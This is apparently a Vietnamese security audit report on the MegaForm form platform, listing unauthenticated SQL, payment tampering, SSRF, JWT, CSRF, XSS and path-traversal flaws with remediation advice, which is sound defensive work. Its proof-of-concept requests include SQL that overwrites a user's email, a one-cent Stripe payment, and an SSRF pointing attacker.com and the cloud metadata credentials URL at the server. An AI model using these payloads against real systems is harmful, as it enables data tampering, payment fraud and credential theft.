# Báo cáo Kiểm tra Bảo mật MegaForm — Round 3 sau 1.7.69 (Mythos)

> **Dự án:** MegaFormSolution_280_Oqtane_um  
> **Ngày kiểm tra:** 2026-07-03  
> **Commit đang xem xét:** `9b61db4` — *fix(security): flow-safe P0 remediation from Mythos audit → 1.7.69*  
> **Build:** 1.7.69  
> **Branch:** `feat/theme-designer-picker-wizard-gallery-1.7.45`  
> **Phương pháp:** Mythos-style audit: attack-surface ranking → parallel discovery → exploitability validation → judge synthesis  
> **Giới hạn:** Chỉ phân tích source code (read-only), không thực hiện tấn công thật, không sửa code.

---

## 1. Executive Summary

Sau khi đánh giá commit bảo mật `1.7.69`, **5 trong số 7 P0 cũ đã được giảm thiểu một phần hoặc toàn phần**, nhưng codebase vẫn còn **ít nhất 4 lỗ hổng P0 (Critical)** có thể khai thác trong production, trong đó có **2 lỗ hổng unauthenticated** mới/phát sinh từ thiết kế cũ. Ngoài ra, lần rà soát này phát hiện thêm **một P0 mới về SSRF** từ public form submission và **một P0 mới về JWT forgery** trong `MegaForm.AspNetCore.Component` mà commit 1.7.69 chưa chạm tới.

**Khuyến nghị tổng thể:** MegaForm **vẫn chưa đủ điều kiện triển khai production** cho đến khi tất cả P0 và các P1 liên quan đến toàn vẹn dữ liệu / thanh toán / auth được xử lý.

### Tổng hợp rủi ro (Round 3)

| Mức độ | Số lượng | Ghi chú |
|--------|----------|---------|
| **P0 — Critical** | 4–5 | Unauth DML (RazorWidget.Action), payment tampering, workflow SSRF, JWT forgery (AspNetCore Component) |
| **P1 — High** | 10+ | CSRF (IgnoreAntiforgeryToken), SQL guard bypass, stored XSS, path traversal, auth bypass style/upload, local AI authenticated RCE |
| **P2 — Medium** | 7 | CORS/cookie, SVG upload, error leak, weak DNN AppEndpoint residual, file-list disclosure |
| **P3 — Low** | 3 | TLS/SSL defaults, SMTP SSL, PII leak |
| **Misconfiguration** | 3 | Hardcoded/placeholder secrets, QA fixtures |
| **Đã fix trong 1.7.69** | 5 | Oqtane Local AI admin-only, Web Local AI [Authorize], DNN AppEndpoint DML/DDL guard, ModuleCss `</` neutralization, Web JWT env-first |

### Các lỗ hổng P0 cần xử lý ngay lập tức

1. **P0-1 (remain)** `RazorWidgetController.Action` — vẫn **unauthenticated DML** (`INSERT/UPDATE/DELETE`) dù đã có `RazorActionSqlGuard`.
2. **P0-2 (remain)** `PaymentController` — client-controlled `amount`/`currency`, chưa được sửa trong 1.7.69.
3. **P0-8 (new)** `WebhookNodeExecutor` — **public form submission → SSRF** tùy ý (no URL allowlist).
4. **P0-9 (new)** `MegaForm.AspNetCore.Component/MegaFormAspNetCoreExtensions.cs` — hardcoded JWT key + `ValidateIssuer=false` + `ValidateAudience=false` → token forgery.

---

## 2. Trạng thái 7 P0 từ audit trước (post-1.7.69)

| ID | Lỗ hổng | Trạng thái sau 1.7.69 | Đánh giá chi tiết |
|----|---------|----------------------|-------------------|
| P0-1 | RazorWidget.Action unauth SQL | **Giảm thiểu một phần** | `RazorActionSqlGuard` đã chặn DROP/ALTER/EXEC/xp_/sp_/stacking/comments, nhưng vẫn cho phép `INSERT/UPDATE/DELETE` unauthenticated. Vẫn là P0. |
| P0-2 | Payment amount tampering | **Không fix** | Comment TODO trong code; yêu cầu coordinated widget + schema change. Vẫn P0. |
| P0-3 | Web MegaFormLocalAiController unauth RCE | **Fixed** | Đã đổi `[AllowAnonymous]` → `[Authorize]`. Không còn unauthenticated. Residual: authenticated any-user vẫn spawn `kimi` nếu env bật → P1. |
| P0-4 | Oqtane MegaFormLocalAiController auth RCE | **Fixed** | Đã giới hạn Admin/Host + env gate. Coi như đóng P0 (vẫn P1 residual nếu admin bị CSRF). |
| P0-5 | Hardcoded JWT key + weak validation | **Fixed trên Web host** | `MegaForm.Web/Program.cs` đọc từ env, placeholder trong `appsettings.Production.json`. **Tuy nhiên** `MegaForm.AspNetCore.Component/MegaFormAspNetCoreExtensions.cs` vẫn giữ nguyên lỗi → P0 mới. |
| P0-6 | Stored XSS via CustomHtml/ModuleCss | **Giảm thiểu một phần** | `ModuleCssComposer` neutralize `</` ngăn breakout khỏi `<style>`. `CustomHtml` vẫn raw by design (admin-trusted). Giảm xuống P1/P2 residual. |
| P0-7 | DNN AppEndpoint WITH bypass | **Fixed** | Regex từ chối DML/DDL keyword ở bất kỳ đâu trong SQL. Coi như đóng P0. |

---

## 3. Phương pháp kiểm tra

1. **Kiểm tra git log/diff** của commit `9b61db4` để xác định phạm vi fix.
2. **Verify trực tiếp** các file đã sửa bằng `ReadFile`/`Grep`.
3. **Rà soát toàn bộ** bằng parallel `explore` agents cho: anonymous endpoints, SQL injection, XSS/SSTI, CSRF/auth, SSRF/upload/RCE.
4. **Judge triage**: deduplicate, validate exploitability, phân loại lại mức độ.
5. **Viết báo cáo** chỉ bao gồm các finding đã được xác minh bằng evidence cụ thể.

---

## 4. Danh sách lỗ hổng đã xác minh (Round 3)

### P0 — Critical

#### P0-1 (remain): `RazorWidgetController.Action` — Unauthenticated DML

- **File:**
  - `MegaForm.Web/Controllers/RazorWidgetController.cs` (dòng 221–244)
  - `MegaForm.Oqtane.Server/Controllers/RazorWidgetController.cs` (dòng 257–281)
  - `MegaForm.DNN/WebApi/RazorWidgetController.cs` (dòng 132–139, proxy `[AllowAnonymous]`)
  - `MegaForm.Core/Services/RazorActionSqlGuard.cs`
- **Mô tả:** Commit 1.7.69 đã thêm `RazorActionSqlGuard` để chặn DROP/ALTER/EXEC/xp_/sp_/stacking/comments. Tuy nhiên, endpoint vẫn **không có `[Authorize]`** và guard vẫn cho phép `INSERT/UPDATE/DELETE`. Kẻ tấn công unauthenticated có thể sửa/xóa dữ liệu trên bất kỳ connection nào trong registry.
- **Evidence:**
  ```csharp
  // RazorActionSqlGuard.IsAllowed — vẫn chấp nhận INSERT/UPDATE/DELETE
  private static readonly Regex AllowedLead = new Regex(
      @"^\s*(SELECT|WITH|INSERT|UPDATE|DELETE)\b", ...);
  ```
  ```csharp
  // MegaForm.Web/Controllers/RazorWidgetController.cs
  [HttpPost("Action")]
  public async Task<IActionResult> Action([FromBody] ActionRequest req)
  {
      ...
      var result = await svc.RunAsync(req.ActionSql, bag, req.ConnectionKey ?? "DashboardDatabase");
      ...
  }
  ```
- **PoC:**
  ```http
  POST /api/MegaFormPopup/RazorWidget/Action HTTP/1.1
  Content-Type: application/json

  { "actionSql": "UPDATE Users SET Email='attacker@x.com' WHERE UserId=1",
    "parameters": {}, "connectionKey": "DashboardDatabase" }
  ```
- **Mức độ:** Critical
- **Khai thác:** Unauthenticated, confirmed
- **Khuyến nghị:**
  - Thêm `[Authorize(Roles = "Administrator")]` / `[Authorize(Policy = "EditModule")]`.
  - **Không bao giờ** tin `actionSql` từ client; tra cứu từ form schema server-side (`formId` + `widgetKey` + `actionName`).
  - Nếu bắt buộc phải chấp nhận client SQL, giới hạn connection chỉ đọc (read replica) hoặc chuyển sang stored-proc whitelist.

#### P0-2 (remain): `PaymentController` — Client-Controlled Amount Tampering

- **File:** `MegaForm.Web/Controllers/PaymentController.cs` (dòng 60–111 Stripe, 267–310 PayPal)
- **Mô tả:** Các endpoint thanh toán **không có `[Authorize]`** và tin `amount`/`currency` từ request body. Commit 1.7.69 chỉ thêm comment TODO, không sửa logic. Attacker có thể tạo Stripe PaymentIntent / PayPal Order với giá bất kỳ.
- **Evidence:**
  ```csharp
  [HttpPost("stripe/create-intent")]
  public async Task<IActionResult> StripeCreateIntent([FromBody] JObject body)
  {
      var amount   = body["amount"]?.Value<double>() ?? 0;
      var currency = (body["currency"]?.Value<string>() ?? "USD").ToLower();
      // [SecFix TODO P0-2] AMOUNT TAMPERING — the amount is still trusted from the client.
      ...
  }
  ```
- **PoC:**
  ```http
  POST /api/megaform/payments/stripe/create-intent HTTP/1.1
  Content-Type: application/json

  { "amount": 0.01, "currency": "usd", "fieldKey": "payment" }
  ```
- **Mức độ:** Critical
- **Khai thác:** Unauthenticated, confirmed
- **Regulatory:** PCI DSS 3.2/4.0 Req 3.4, 6.5.1, 11.3.2
- **Khuyến nghị:**
  - Widget gửi kèm `formId` + `fieldKey`.
  - Server load form schema, xác định giá cố định (`fixedPrice`) và bắt buộc số tiền đó.
  - Chỉ cho phép variable amount khi field schema đánh dấu `allowUserAmount=true` và validate min/max.

#### P0-8 (new): `WebhookNodeExecutor` — Public Form Submission → SSRF

- **File:** `MegaForm.Core/Workflow/WebhookNodeExecutor.cs` (dòng 36–180)
- **Mô tả:** Workflow node `Webhook` gọi URL được resolve từ template qua `WorkflowEvaluator.ResolveTemplate`. `config.Url` có thể chứa token `{{field.xxx}}`/`{{variable.xxx}}`, trong đó `ctx.FormData` đến từ public form submission. Không có allowlist scheme/host, không chặn private IP/metadata URL, không DNS-rebinding protection. Một public form submission có thể buộc server gửi HTTP request đến bất kỳ đâu (cloud metadata, internal APIs) khi workflow URL dùng field tokens. Ngay cả khi URL static, admin vẫn có thể buộc server gọi internal services.
- **Evidence:**
  ```csharp
  string url = ResolveTemplate(config.Url, ctx);
  ...
  var request = BuildRequest(url, method, body, config, ctx);
  var response = await _http.SendAsync(request, timeoutCts.Token);
  ```
  ```csharp
  // WorkflowEvaluator.ResolveTemplate replaces {{field.xxx}} with ctx.FormData value
  if (expr.StartsWith("field.", StringComparison.OrdinalIgnoreCase))
      return GetDataValue(ctx.FormData, expr.Substring(6));
  ```
- **PoC:** Workflow URL = `https://attacker.com/?x={{field.email}}`. Attacker submits `email = http://169.254.169.254/latest/meta-data/iam/security-credentials/role`. Server resolves URL và gọi cloud metadata.
- **Mức độ:** Critical
- **Khai thác:** Unauthenticated (qua public form submission), confirmed
- **Regulatory:** DORA ICT Risk Art. 6, NIS2 Art. 21, OWASP API Top 10 2023 API6
- **Khuyến nghị:**
  - Thêm URL allowlist per-form (admin-configured) với regex scheme/host.
  - Chặn private IP ranges, loopback, metadata endpoints.
  - Giới hạn DNS rebinding bằng cách resolve + validate IP trước khi gửi.
  - Mặc định tắt webhook URL từ form data (chỉ cho phép static URL hoặc admin template).

#### P0-9 (new): `MegaForm.AspNetCore.Component` — Hardcoded JWT Key + Weak Validation

- **File:** `MegaForm.AspNetCore.Component/MegaFormAspNetCoreExtensions.cs` (dòng 345–358)
- **Mô tả:** Trong khi `MegaForm.Web/Program.cs` đã chuyển sang đọc JWT key từ env, extension `AddMegaFormAuthentication` trong `MegaForm.AspNetCore.Component` vẫn lấy key từ config và tắt hoàn toàn issuer/audience validation. Bất kỳ host nào dùng extension này (CorporateWeb, AspNetCore host samples) đều dễ bị forge token admin.
- **Evidence:**
  ```csharp
  o.TokenValidationParameters = new TokenValidationParameters
  {
      ValidateIssuer = false,
      ValidateAudience = false,
      ValidateLifetime = true,
      ValidateIssuerSigningKey = true,
      IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey))
  };
  ```
- **Mức độ:** Critical
- **Khai thác:** Auth bypass / privilege escalation, confirmed
- **Regulatory:** DORA ICT Risk Art. 8, NIS2 Art. 21, CRA Art. 13
- **Khuyến nghị:**
  - Đồng bộ với Web host: đọc `MEGAFORM_JWT_KEY`, `MEGAFORM_JWT_ISSUER`, `MEGAFORM_JWT_AUDIENCE` từ environment.
  - Bật `ValidateIssuer`/`ValidateAudience` khi có giá trị.
  - Yêu cầu key đủ dài (≥256 bit) và không commit key thật.

---

### P1 — High

#### P1-1: Class-Level `[IgnoreAntiforgeryToken]` on Admin Controllers (Oqtane + Web)

- **File:**
  - Oqtane: `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs:47`, `AiToolsController.cs:28`, `SubformController.cs:30`, `RazorWidgetController.cs:24`, `UserTemplateController.cs:64`, `MegaFormLocalAiController.cs:32`, `AiAssistantController.cs:28`, `AiKnowledge*Controller.cs`
  - Web: `MegaForm.Web/Controllers/UserTemplateController.cs:15`, `SubformController.cs:21`, `ReportsController.cs:22`, `RazorWidgetController.cs:20`, `MegaFormLocalAiController.cs:23`, `AiToolsController.cs:24`, `AiKnowledge*Controller.cs`
- **Mô tả:** `[IgnoreAntiforgeryToken]` ở class level vô hiệu hóa antiforgery cho **mọi action**, kể cả admin mutators (`SaveForm`, `SaveStyle`, `ExecuteDdl`, `UpsertRule`, `RefreshTemplate`). Kết hợp với `AllowAnyOrigin` CORS, admin bị CSRF dẫn đến stored XSS (qua `cssOverride`/`customCss`) hoặc phá hoại dữ liệu.
- **Evidence:**
  ```csharp
  [Route("api/MegaFormPopup/[controller]")]
  [IgnoreAntiforgeryToken]
  public class RazorWidgetController : ControllerBase { ... }
  ```
- **Mức độ:** High
- **Khai thác:** CSRF against authenticated admin, confirmed
- **Regulatory:** DORA ICT Risk Art. 8, NIS2 Art. 21, OWASP Top 10 2021 A01
- **Khuyến nghị:**
  - Gỡ bỏ class-level `[IgnoreAntiforgeryToken]`.
  - Chỉ áp dụng `[IgnoreAntiforgeryToken]` trên các action public thực sự (`Submit`, `Upload/File`, public schema).
  - Thêm `[ValidateAntiForgeryToken]` hoặc `[AutoValidateAntiforgeryToken]` cho admin mutators.

#### P1-2: `SaveStyle` / `SaveModuleStyle` — IDOR + CSRF

- **File:**
  - Oqtane: `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs:2665–2765` (`SaveStyle`, `SaveModuleStyle`)
  - Web: `MegaForm.Web/Controllers/MegaFormController.cs:1034–1054` (`SaveStyle`)
  - DNN: `MegaForm.DNN/WebApi/MegaFormApiController.cs:3572–3595`
- **Mô tả:** `CanUseAdminPopup()` trong Oqtane chỉ check `User.Identity.IsAuthenticated`. Kết hợp với class-level `[IgnoreAntiforgeryToken]`, user bất kỳ có thể CSRF-POST để ghi đè style/module CSS của module khác (stored XSS/defacement). Web `SaveStyle` thiếu `[ValidateAntiForgeryToken]`; DNN có `[ValidateAntiForgeryToken]` nhưng không check module ownership.
- **Evidence:**
  ```csharp
  private bool CanUseAdminPopup() => User?.Identity?.IsAuthenticated == true;
  ```
- **Mức độ:** High
- **Khai thác:** IDOR + CSRF → stored XSS, confirmed
- **Khuyến nghị:**
  - Check `EditModule` policy / module ownership.
  - Thêm antiforgery cho Web/Oqtane.
  - Validate user có quyền trên `moduleId` cụ thể.

#### P1-3 (residual): Web `MegaFormLocalAiController.ChatCompletions` — Authenticated RCE

- **File:** `MegaForm.Web/Controllers/MegaFormLocalAiController.cs` (dòng 44–46, 181–207)
- **Mô tả:** Commit 1.7.69 đã đổi `[AllowAnonymous]` → `[Authorize]`, loại bỏ surface unauthenticated. Tuy nhiên endpoint vẫn cho phép **bất kỳ authenticated user** spawn `kimi` CLI khi `MEGAFORM_ALLOW_LOCAL_AI_CLI=1`. Khác với Oqtane đã giới hạn Admin/Host.
- **Evidence:**
  ```csharp
  [HttpPost("chat/completions")]
  [Authorize]
  public async Task<IActionResult> ChatCompletions()
  ...
  if (!string.Equals(Environment.GetEnvironmentVariable("MEGAFORM_ALLOW_LOCAL_AI_CLI"), "1", ...))
      return null;
  var psi = new ProcessStartInfo("kimi", ...) { ArgumentList = { "chat", "--no-stream", query } };
  ```
- **Mức độ:** High
- **Khai thác:** Authenticated RCE (env-gated), confirmed
- **Khuyến nghị:** Giới hạn Web endpoint tương tự Oqtane: `[Authorize(Roles = "Administrator,Host")]` + role check inline.

#### P1-4: `FieldOptionsService` — Weak `IsDangerousQuery` Guard + Stored-Proc Bypass

- **File:** `MegaForm.Core/Services/FieldOptionsService.cs` (dòng 251–270, 455–469)
- **Mô tả:** Guard chỉ kiểm tra keyword theo sau bởi **dấu cách** (`INSERT `, `UPDATE `, …). `INSERT\tINTO` hoặc `INSERT\nINTO` bypass. Chế độ `optionsType=storedproc` thực thi proc name bất kỳ không qua validation. Public endpoints DNN/Oqtane cho phép anonymous gọi.
- **Evidence:**
  ```csharp
  private static readonly string[] _danger = new[] { "INSERT ", "UPDATE ", "DELETE ", "DROP ", ... };
  private static bool IsDangerousQuery(string sql)
  {
      var upper = " " + sql.ToUpperInvariant() + " ";
      return _danger.Any(d => upper.Contains(d));
  }
  ```
- **Mức độ:** High
- **Khai thác:** SQL injection / arbitrary stored-proc execution, confirmed
- **Khuyến nghị:**
  - Dùng word-boundary regex (`\bINSERT\b`) và chặn whitespace obfuscation.
  - Validate stored-proc name against whitelist hoặc cấm stored-proc mode trên public endpoints.

#### P1-5: `FormDatabaseInsertService` — Multi-Statement Bypass

- **File:** `MegaForm.Core/Services/FormDatabaseInsertService.cs` (dòng 57–103, 210+)
- **Mô tả:** `InsertSql` từ form settings được chạy trên mỗi public submission. `IsDangerousNonInsertQuery` chỉ block keyword với trailing space, không chặn statement stacking. Payload dạng `INSERT ...;UPDATE\nT SET...` có thể bypass và thực thi.
- **Evidence:**
  ```csharp
  cmd.CommandText = _paramRx.Replace(cfg.InsertSql, "@$1");
  result.RowsAffected = cmd.ExecuteNonQuery();
  ```
- **Mức độ:** High
- **Khai thác:** SQL injection via public form submission, confirmed
- **Khuyến nghị:**
  - Từ chối `;`, `GO`, comments, và bất kỳ DML/DDL nào ngoài `INSERT`.
  - Parse/validate chỉ một INSERT statement.

#### P1-6: `LifecycleRunner` — Weak Hook SQL Guard

- **File:** `MegaForm.Core/Services/LifecycleRunner.cs` (dòng 174–181, 288–296)
- **Mô tả:** Lifecycle hook SQL (chạy trên public submission) chỉ bị chặn `DROP DATABASE`, `TRUNCATE TABLE`, `XP_CMDSHELL`, `SHUTDOWN`. Cho phép `EXEC`, `DROP TABLE`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, v.v.
- **Evidence:**
  ```csharp
  private static bool IsDangerousVerb(string sql)
  {
      var s = sql.ToUpperInvariant();
      return s.Contains("DROP DATABASE") || s.Contains("TRUNCATE TABLE")
          || s.Contains("XP_CMDSHELL") || s.Contains("SHUTDOWN");
  }
  ```
- **Mức độ:** High
- **Khai thác:** Arbitrary SQL/DML via public form submission, confirmed
- **Khuyến nghị:** Tái sử dụng `RazorActionSqlGuard` hoặc `SqlDdlGuard`; hoặc chuyển lifecycle hook sang stored-proc whitelist.

#### P1-7: Stored XSS via `FormHtmlRenderer` `{{content:*}}` Token

- **File:** `MegaForm.Core/Services/FormHtmlRenderer.cs` (dòng 214–220)
- **Mô tả:** `RenderCustomHtml` chèn `settings.CustomContent[key]` **verbatim** vào HTML. Dù client renderer escape, server-side SSR (Oqtane `RenderPage` / `Index.razor`) không encode. Nếu attacker thay đổi form settings (CSRF/admin compromise), nội dung này thành stored XSS.
- **Evidence:**
  ```csharp
  html = Regex.Replace(html, @"\{\{content:([a-zA-Z0-9_\-]+)\}\}", m =>
  {
      var key = m.Groups[1].Value;
      return content.TryGetValue(key, out var v) ? (v ?? string.Empty) : string.Empty;
  });
  ```
- **Mức độ:** High
- **Khai thác:** Stored XSS (via admin/CSRF), confirmed
- **Khuyến nghị:** HTML-encode token values trong `RenderCustomHtml`.

#### P1-8: `Files/Download` — Path Traversal

- **File:**
  - Oqtane: `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs:1774–1790`
  - DNN: `MegaForm.DNN/WebApi/MegaFormApiController.cs:2987–3029`
- **Mô tả:** Sanitization dùng `path.Replace("..", string.Empty)` là anti-pattern và có thể bypass (ví dụ `..././`, encoded sequences, case-alternation trên FS nhạy cảm). Không dùng `Path.GetFullPath` để normalize.
- **Evidence:**
  ```csharp
  var safePath = path.Replace("..", string.Empty).TrimStart('/', '\\').Replace('/', Path.DirectorySeparatorChar);
  var fullPath = Path.Combine(appDataRoot, safePath);
  if (!fullPath.StartsWith(appDataRoot, StringComparison.OrdinalIgnoreCase) || !File.Exists(fullPath))
      return NotFound();
  ```
- **Mức độ:** High
- **Khai thác:** Path traversal (authenticated), likely
- **Khuyến nghị:**
  - Dùng `Path.GetFullPath` sau khi combine.
  - Validate `safePath` chỉ chứa `[a-zA-Z0-9_\-/\.]` và không có `..`.

#### P1-9: `Upload/Image` + `Upload/List` — Public Image Upload Leak & SVG XSS

- **File:**
  - DNN: `MegaForm.DNN/WebApi/MegaFormApiController.cs:3036–3215` (`UploadController`)
  - Oqtane: `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs:1608–1695`
- **Mô tả:** `Upload/List` trong DNN là `[AllowAnonymous]` và liệt kê tất cả ảnh trong `/Portals/{id}/MegaForm/Images/`. SVG upload check chỉ tìm `<svg` hoặc `<?xml` ở dòng đầu, không strip `<script>`/event handlers → stored XSS khi SVG được serve từ cùng origin.
- **Evidence:**
  ```csharp
  [AllowAnonymous]
  public class UploadController : DnnApiController { ... }
  ```
- **Mức độ:** High
- **Khai thác:** Information disclosure + stored XSS, confirmed
- **Khuyến nghị:**
  - Yêu cầu auth cho `Upload/List`.
  - Sanitize SVG (strip script/event handlers) hoặc serve với `Content-Disposition: attachment`.

#### P1-10: `UserTemplateController` — CSRF → Template Overwrite

- **File:**
  - Web: `MegaForm.Web/Controllers/UserTemplateController.cs:15`
  - Oqtane: `MegaForm.Oqtane.Server/Controllers/UserTemplateController.cs:64`
- **Mô tả:** Class-level `[IgnoreAntiforgeryToken]`; write actions (`Refresh`, `PutSource`) chỉ gated bởi `IsHostOrAdmin()`. CSRF against host/admin có thể ghi đè template files (`template.cshtml`, `template.js`).
- **Mức độ:** High
- **Khai thác:** CSRF → SSTI/code execution, confirmed
- **Khuyến nghị:** Thêm antiforgery và validate file path whitelist.

---

### P2 — Medium

#### P2-1: CORS `AllowAnyOrigin` + `AllowAnyMethod` + `AllowAnyHeader`

- **File:** `MegaForm.Web/Program.cs:158–159`
- **Mô tả:** Default CORS policy cho phép bất kỳ origin nào gọi bất kỳ method/header nào. Kết hợp với cookie auth và class-level `[IgnoreAntiforgeryToken]` làm CSRF dễ dàng hơn.
- **Khuyến nghị:** Hạn chế origin cụ thể trong production; không dùng `AllowAnyOrigin` khi có cookie auth.

#### P2-2: Cookie `SecurePolicy = SameAsRequest`

- **File:** `MegaForm.Web/Program.cs:125–127`; `MegaForm.AspNetCore.Component/MegaFormAspNetCoreExtensions.cs:342`
- **Mô tả:** Cookie auth không bắt buộc `Secure`; `SameSite = Lax`. Trên deployment mixed HTTP/HTTPS, cookie có thể bị lộ.
- **Khuyến nghị:** `Cookie.SecurePolicy = Always` và `SameSite = Strict` hoặc `Lax` với HSTS.

#### P2-3: DNN `AppEndpoint` — Residual Razor Mode + Admin Misconfig

- **File:** `MegaForm.DNN/WebApi/AiToolsController.cs:1359–1501`
- **Mô tả:** Sau fix 1.7.69, SQL mode đã an toàn hơn. Tuy nhiên endpoint vẫn `[AllowAnonymous]` và có mode `razor` (stub) chạy code từ `MF_AppEndpoints.SqlOrSource`. Nếu admin bật `AllowAnonymous` hoặc razor mode hoàn thiện, surface sẽ trở lại nguy hiểm.
- **Khuyến nghị:** Tắt razor mode hoặc sandbox; audit `MF_AppEndpoints` row permissions.

#### P2-4: `ReportsController` / Upload File — Stored Malicious Content

- **File:** `MegaForm.Web/Controllers/MegaFormController.cs:916–989`; tương tự DNN/Oqtane
- **Mô tả:** Private file upload cho phép `.txt`, `.csv`, `.webp`, `.docx`, `.pdf`. Kiểm tra magic-byte không ngăn polyglot HTML/JS trong `.txt`/`.csv`. Nếu `Files/Download` trả về với content-type sniffable, có thể thực thi JS.
- **Khuyến nghị:** Serve private uploads với `X-Content-Type-Options: nosniff` và `Content-Disposition: attachment`.

#### P2-5: `BuilderTemplateCatalogStore` / `TemplatePackageService` — ZIP Extraction

- **File:** `MegaForm.Core/Services/BuilderTemplateCatalogStore.cs:175–266`; `MegaForm.Core/Services/TemplatePackageService.cs:155–276`
- **Mô tả:** Admin-only import ZIP. `ExtractToDirectory` không giới hạn entry count/size; chỉ scan `template.js`/`template.html`; các file khác copy unchecked. Symlink/absolute path entries có thể bypass `NormalizeRelativePath`.
- **Khuyến nghị:** Giới hạn số entry, kích thước; reject symlink/absolute paths; scan toàn bộ file JS/HTML.

#### P2-6: SaaS/HTTP Providers — Arbitrary Base URL SSRF

- **File:** `MegaForm.Core/Integrations/SaasAutomation/HttpSaasAutomationProviderBase.cs:27–34`; `MegaForm.Core/Integrations/Storage/HttpStorageProviderBase.cs:30–51`
- **Mô tả:** `settings.BaseUrl` không được validate. Admin compromise hoặc malicious config làm provider gọi internal services.
- **Khuyến nghị:** Validate base URL against provider-specific allowlist.

#### P2-7: Verbose Error Leaks

- **File:** Nhiều controller trả về `ex.Message` trong response (ví dụ `MegaForm.Web/Controllers/RazorWidgetController.cs:241`, DNN `AiToolsController.AppEndpoint:1504`).
- **Mô tả:** Stack trace / DB error chi tiết có thể lộ schema, connection info.
- **Khuyến nghị:** Log chi tiết server-side, trả về generic message client-side.

---

### P3 — Low / Informational

#### P3-1: JWT Issuer/Audience Validation Toggled by Config

- **File:** `MegaForm.Web/Program.cs:136–139`
- **Mô tả:** `ValidateIssuer`/`ValidateAudience` chỉ bật khi env/config non-empty. Nếu admin quên set, deployment chấp nhận token từ mọi issuer.
- **Khuyến nghị:** Mặc định bật validation; fail closed nếu thiếu issuer/audience.

#### P3-2: DNN Public Endpoints Return `Access-Control-Allow-Origin: *`

- **File:** `MegaForm.DNN/WebApi/MegaFormApiController.cs:850–858`
- **Mô tả:** By design cho cross-site embeds, nhưng kết hợp với anonymous submission làm probing dễ dàng.
- **Khuyến nghị:** Cho phép origin whitelist nếu business cho phép.

#### P3-3: QA Fixtures / Hardcoded Test Secrets

- **File:** Cần rà soát thêm `Assets/qa/`, `MegaForm.UI/qa-out/`, `_backup_frontend_controls_20260601_100859/`
- **Mô tả:** Có thể chứa hardcoded API keys, passwords.
- **Khuyến nghị:** Audit và loại bỏ trước khi build production.

---

## 5. Regulatory Mapping

| Lỗ hổng | DORA | NIS2 | CRA | PCI DSS |
|---------|------|------|-----|---------|
| P0-1 Unauth DML | Art. 6, 8 | Art. 21 | Art. 13 | 6.5.1, 11.3.2 |
| P0-2 Payment tampering | Art. 6 | Art. 21 | Art. 13 | 3.4, 6.5.1, 11.3.2 |
| P0-8 Workflow SSRF | Art. 6 | Art. 21 | Art. 13 | 6.5.2 |
| P0-9 JWT forgery | Art. 8 | Art. 21 | Art. 13 | 8.2, 8.3 |
| P1 CSRF | Art. 8 | Art. 21 | Art. 13 | 6.5.9 |
| P1 IDOR style/upload | Art. 8 | Art. 21 | Art. 13 | 7.1 |
| P1 SQL guard bypass | Art. 6 | Art. 21 | Art. 13 | 6.5.1 |
| P1 Stored XSS | Art. 8 | Art. 21 | Art. 13 | 6.5.7 |
| P1 Path traversal | Art. 6 | Art. 21 | Art. 13 | 6.5.3 |

---

## 6. Khuyến nghị tổng thể

1. **Không triển khai production** cho đến khi 4 P0 được xử lý.
2. **Ưu tiên cao nhất:**
   - Bổ sung auth + server-side schema lookup cho `RazorWidgetController.Action`.
   - Triển khai server-side price resolution cho `PaymentController`.
   - Thêm SSRF allowlist vào `WebhookNodeExecutor` / `WebhookService`.
   - Sửa `MegaForm.AspNetCore.Component` JWT validation đồng bộ với Web host.
3. **Hardening P1:**
   - Gỡ class-level `[IgnoreAntiforgeryToken]`; thêm antiforgery cho admin endpoints.
   - Củng cố các SQL guard (`FieldOptionsService`, `FormDatabaseInsertService`, `LifecycleRunner`).
   - HTML-encode `{{content:*}}` token values.
   - Sửa path traversal trong `Files/Download`.
4. **Operational:**
   - Rotate JWT key đã leak trong các commit trước 1.7.69.
   - Audit `MF_AppEndpoints` permissions.
   - Kiểm tra env `MEGAFORM_ALLOW_LOCAL_AI_CLI`/`MEGAFORM_ALLOW_LOCAL_CLI` không bật trong production.

---

## 7. Changelog so với audit trước

- **Đã đóng:** P0-3 (Web Local AI unauth), P0-4 (Oqtane Local AI auth → admin-only), P0-7 (DNN AppEndpoint WITH bypass), P0-6 phần CSS breakout.
- **Vẫn mở:** P0-1 (nhưng giảm từ arbitrary SQL xuống unauth DML), P0-2.
- **Mới phát hiện:** P0-8 (workflow SSRF), P0-9 (AspNetCore Component JWT).
- **Mở rộng phân tích:** CSRF class-level, IDOR SaveStyle, path traversal Files/Download, weak SQL guards trong Core services, SVG upload XSS.

---

*End of Round 3 audit report.*
